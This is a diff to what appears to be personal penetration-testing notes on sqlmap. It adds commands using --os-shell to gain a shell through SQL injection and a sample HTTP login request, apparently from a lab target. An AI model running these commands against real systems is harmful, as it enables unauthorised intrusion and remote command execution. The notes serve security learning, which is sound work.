@@ -28,6 +28,39 @@ sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> -D <database_name>
 - `D` DBMS database to enumerate
 - `--dump` Dump DBMS database table entries
 
+To obtain a reverse shell we can use:
+
+```bash
+sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> --os-shell --batch
+```
+
+And we can use a request file to avoid the need of the URL:
+
+```bash
+sqlmap -r <request_file> --threads <NUMBER> --os-shell --batch
+```
+
+A request file would look something like this:
+
+```
+POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
+Host: www.securewebinc.jet
+Content-Length: 25
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://www.securewebinc.jet
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=2jn4imainfddc3vatcddfoafg5
+Connection: close
+
+username=admin&password=a
+```
+
 ## Docs
 
 - https://github.com/sqlmapproject/sqlmap/wiki/Usage
